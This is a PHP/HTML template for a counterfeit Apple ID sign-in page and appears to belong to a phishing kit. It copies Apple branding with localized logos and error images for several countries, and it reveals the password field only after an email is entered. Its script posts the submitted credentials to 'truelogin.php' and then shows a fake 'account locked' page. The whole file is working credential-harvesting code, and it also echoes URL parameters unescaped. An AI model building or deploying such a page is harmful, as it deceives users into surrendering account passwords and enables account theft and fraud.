<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title</title>";
?>
    <link rel="stylesheet" type="text/css" href="../assets/css/style-login-desktop.css">
    <script type="text/javascript" src="../assets/js/script-login-desktop.js"></script>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".option").click(function(){
    $(this).toggleClass('option2')
});
});//]]> 

$(document).ready(function(){
    $("#salah").click(function(){
        $("#salah").fadeOut("slow");
    });
});

function ChangePlaceholder(){
document.getElementById("xuser").placeholder = "name@example.com";
$("#salah").fadeOut("slow");
}
function Bukapass(){
document.getElementById("xuser").style.borderRadius = "0";
document.getElementById("xuser").style.borderTopLeftRadius = "6px";
document.getElementById("xuser").style.borderTopRightRadius = "6px";
document.getElementById('bukapass').style.display = "none";
document.getElementById('xpass').style.display = "block";
document.getElementById('xbtn').style.display = "block";
document.getElementById('loadpass').style.display = 'none';
}
function ChangeBack(){
document.getElementById("xuser").placeholder = "Apple ID";
}
function Activate(){
document.getElementById('xbtn').className = "xbtn2";
$("#salah").fadeOut("slow");
}
function loading(){
document.getElementById('loading').style.display = "block";
document.getElementById('xbootn').style.display = "none";
document.getElementById('xbtn').style.display = "none";
}

$(document).ready(function() {
    document.getElementById('xpass').style.display = "none";
    document.getElementById('xbtn').style.display = "none";
     $('#xuser').keypress(function(e) {
    if (e.which == 13) {
        document.getElementById('loadpass').style.display = 'block';
        document.getElementById('bukapass').style.display = 'none';
        setTimeout(Bukapass, 2000);
        e.preventDefault();
    }
    });
  
$("#form_login").on('submit', function(e){
    document.getElementById('loading').style.display = "block";
    document.getElementById('xbootn').style.display = "none";
    document.getElementById('xbtn').style.display = "none";
    e.preventDefault();
        $.ajax({
          type: 'POST',
          url: 'truelogin.php',
          data: $('#form_login').serialize(),
          success: function() {
              $('#result').load('files/locked.php?country=<?php echo $_GET['country'];?>');
            //document.getElementById('lockednya').style.display = "block";
            document.getElementById('form_login').style.display = "none";
          },
          error: function() {
            console.log("Signup was unsuccessful");
          }
        });
    });
});
</script>
<?php 
      if($lang == "ES") {
        $img = "apple-es.png";
      }else{
      if($lang == "FR") {
        $img = "apple-fr.png";
      }else{
        $img = "logo.png";
      }
      }
      $incor = "../assets/img/incorrect.png";
      $locked = "../assets/img/apple_locked.png";
      $width = "299";
      $height = "63";
      $top = "180";
      $left = "215";
      if($lang == "JP") {
        $incor = "../assets/img/incorrect-jp.png";
        $locked = "../assets/img/apple_locked-jp.png";
        $width = "299";
        $height = "63";
        $top = "200";
        $left = "180";
      }
      if($lang == "FR") {
        $incor = "../assets/img/incorrect-fr.png";
        $locked = "../assets/img/apple_locked-fr.png";
        $width = "299";
        $height = "83";
        $top = "200";
      }
      if($lang == "ES") {
        $incor = "../assets/img/incorrect-es.png";
        $locked = "../assets/img/apple_locked-es.png";
        $width = "299";
        $height = "83";
        $top = "200";
      }
      if($lang == "CN") {
        $incor = "../assets/img/incorrect-cn.png";
        $locked = "../assets/img/apple_locked-cn.png";
        $width = "299";
        $height = "63";
        $top = "160";
      }
      ?>
<style>
.incorrect {
  background-image: url("<?php echo $incor;?>");
  background-repeat: no-repeat;
  width: <?php echo $width;?>px;
  height: <?php echo $height;?>px;
  top: 250px;
  left: 70px;
  border-radius: 6px;
  position: absolute;
}

.locked {
  background-image: url("<?php echo $locked;?>");
  background-repeat: no-repeat;
  width: 550px;
  height: 400px;
  top: 60px;
  left: -40px;
  position: absolute;display: none;
}
.button:focus>span {
    -webkit-box-shadow:0 0 6px #007eff;
    -moz-box-shadow:0 0 6px #007eff;
    box-shadow:0 0 6px #007eff
}
.button:focus {
    outline:1px dotted black \0/
}
.button:hover {
    text-decoration:none
}
.button:-moz-focusring {
    outline:1px dotted
}
.button.disabled>span, .button.disabled:hover>span {
    cursor:default;
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
}
.button.rect.disabled {
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
    background:#4c88bc;
}

.ns .button, .button.rect {
    font-size: 17px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec, #0070c9);
    border-color: #07c;
    border-width: 1px;
    border-style: solid;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding-left: 15px;
    padding-right: 15px;
    padding-top: 4px;
    padding-bottom: 4px;
    text-align: center;
    white-space: nowrap
}
.ns .button:hover, .ns .button:focus, .button.rect:hover, .button.rect:focus {
    background:#0351b7;
    background:-webkit-linear-gradient(#2f90d5, #0351b7);
    background:-moz-linear-gradient(#2f90d5, #0351b7);
    background:linear-gradient(#2f90d5, #0351b7)
}
.ns .button:active, .ns .button.active, .button.rect:active, .button.rect.active {
    -webkit-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    -moz-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5)
}
.ns .button.community-alt {
    background:0;
    border:0;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button.community-alt:active, .ns .button.community-alt.active {
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button>span, .button.rect>span {
    color:#fff;
    font-size:13px;
    line-height:15px;
    padding:9px 28px;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none;
    background:0;
    border:0;
    -webkit-border-radius:4px;
    -moz-border-radius:4px;
    border-radius:4px
}
.ns .compound-button .handle>span {
    font-size:13px
}
.ns .button:hover>span, .ns .button:focus>span, .button.rect:hover>span, .button.rect:focus>span {
    background-color:transparent;
    border-color:transparent;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.button.rect.small>span {
    padding:7px 18px
}
.button.rect.large>span {
    font-size:18px;
    line-height:16px;
    padding:12px 28px
}
input[type=checkbox] {
    font-size: 19px;
    line-height: 1.47384;
    font-weight: 400;
    letter-spacing: .015em;
    font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    color: #fff;
    padding: 0;
    width: 30px;
    vertical-align: top;
}
</style>
</head>
<body>
    
<div id="bottom"></div>
<div id="head">
    <img src="../assets/img/apple-white-logo-circle-5k-17-1080x1920.jpg" style="width: 200px;
height: 350px;
align-items: center;
align-content: center;
margin: 0 auto;
position: relative;
top: -7%;
left: 45vw;">
  </div>
<div id="<?php echo $bahasas;?>sub_navbar"></div>
<div id="container">
  <div id="xheader">
    <div id="<?php echo $bahasas;?>navbar"></div>
  </div>
  <div id="result"></div>
  <div id="xcontent" class="fade-in">

    <form action="" id="form_login" method="POST" autocomplete="off" target="_self" name="xlogin" validate="validate">

      <font id="Apple_ID">
          <img src="../assets/img/<?php echo $img;?>" width="200px" style="filter:invert()">
      </font>
      <?php
      echo "<font id=\"Manage_Account\">$login_manage</font>";
      ?>
                        <div>
      <input name="xuser" style="border-radius:6px;" id="xuser" minlenght="6" type="email" value="<?php echo $_GET['email'];?>" required="required" placeholder="Apple ID" onblur="ChangeBack();" onclick="ChangePlaceholder();">
      <input name="xpass" id="xpass" type="password" value="" minlength="6" placeholder="<?php echo $input_password;?>" required="required" onkeyup="Activate();">
      <div id="xbootn"><input style="position:absolute;top:160px;" id="bukapass" class="xbtn1" onclick="document.getElementById('loadpass').style.display = 'block';document.getElementById('bukapass').style.display = 'none';setTimeout(Bukapass, 2000);"><input name="xbtn" id="xbtn" class="xbtn1" type="submit" value=""></div></div>
      <div id="loading"></div>
      <div id="loadpass" style="position:absoulte;top:160px;"></div>
      <input type="checkbox" style="position:absolute;top:257px;left:145px;">
      <font id="Remember_me"><?php echo $remember_me;?></font>
      <?php
      if($_GET['error'] == 1) {
      echo '<span id="salah" class="incorrect"></span>';
      }?>
        <div id="login-options-separator"></div>
      <font id="Forgot_Apple_ID"><?php echo $forgot_id;?></font>
    </form>
  </div>
  <div id="<?php echo $bahasa;?>footer"></div>
</div>
<div id="containerfooter">
<?php
if($lang == "PE") {?>
<div id="pefooterbawah"></div>
<?php
}?>
<?php
if($lang == "CO") {?>
<div id="cofooterbawah"></div>
<?php
}?>
<?php
if($lang == "MX") {?>
<div id="mxfooterbawah"></div>
<?php
}?>
<?php
if($lang == "AR") {?>
<div id="arfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PY") {?>
<div id="pyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "UY") {?>
<div id="uyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "EC") {?>
<div id="ecfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PE" or $lang == "MX" or $lang == "CO" or $lang == "AR" or $lang == "UY" or $lang == "PY" or $lang == "EC") {
}else{?>
<div id="<?php echo $bahasas;?>footerbawah"></div>
<?php
}
?>
</div>
</body>
</html>